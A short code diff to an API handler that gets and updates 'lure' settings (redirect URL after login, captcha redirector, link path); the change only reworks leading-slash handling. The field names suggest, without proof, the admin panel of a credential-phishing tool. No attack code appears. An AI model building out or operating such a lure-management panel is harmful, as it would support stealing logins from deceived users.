@@ -20,14 +20,20 @@ export default async function handler(
       const lures = config.lures || [];
       // Get values from the first lure, or return defaults
       const lure = lures[0] || {};
+
+      // Get the path, removing leading slash for display in UI
+      const path = lure.path || "";
+      const displayPath = path.startsWith("/") ? path.substring(1) : path;
+
       return res.status(200).json({
         afterLoginRedirect: lure.redirect_url || "",
         useCaptcha: lure.redirector === "main",
-        linkPath: (lure.path || "").replace(/^\/+/, ""), // Remove leading slash
+        linkPath: displayPath, // Return without leading slash for UI display
       });
     } else if (req.method === "POST") {
       const { afterLoginRedirect, useCaptcha, linkPath } = req.body;
 
+      // The configService will handle ensuring the path has a leading slash
       const success = await configService.updateLinkSettings(
         afterLoginRedirect || "",
         useCaptcha || false,
